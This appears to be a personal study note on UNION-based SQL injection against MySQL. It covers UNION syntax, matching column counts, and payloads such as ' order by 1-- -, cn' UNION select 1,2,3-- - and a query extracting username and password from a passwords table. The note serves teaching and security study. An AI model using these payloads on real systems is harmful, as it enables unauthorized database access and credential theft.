---
title: e-Union Clause
draft: false
tags:
  - union
---
We can inject entire SQL query to be executed along with the original query.

## Union

`Union` clause is used to combine results from multiple `SELECT` statements. 

We can use `Union` as such:

```shell-session
mysql> SELECT * FROM ports UNION SELECT * FROM ships;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
4 rows in set (0.00 sec)
```

## Even Columns

`Union` statement only operates on `SELECT` statements with an equal number of columns. 

If we try to `Union` two queries with different number of columns, we get an error:

```shell-session
mysql> SELECT city FROM ports UNION SELECT * FROM ships;

ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

Query below will return `username` and `password` from the `passwords` table, assuming `products` table has two columns:

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

## Un-even Columns

Original query usually doesn't have the same number of columns as the SQL query we want to execute.

Let's say `products` table has two columns, so we have to `UNION` with two columns as such:

```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

## Union Injection

### Detect number of columns

Let's say we identified SQL injection vulnerability. Before exploiting it, we need to identify number of columns.

There are two ways:

- Using `ORDER BY`
- Using `UNION`

#### ORDER BY

We can start with `order by 1` and increment until we get an error. 

The final successful column we successfully sorted gives us the number of columns.

e.g

```sql
' order by 1-- -
```

#### UNION

Attempt with a different number of columns until we successfully get the results back:

```sql
cn' UNION select 1,2,3-- -
```

### Location of Injection

Now that we have identified number of columns, we have to identify injection point. 

Web app may only display certain columns, not all of them.

We can test out each column as such:

```sql
cn' UNION select 1,@@version,3,4-- -
```

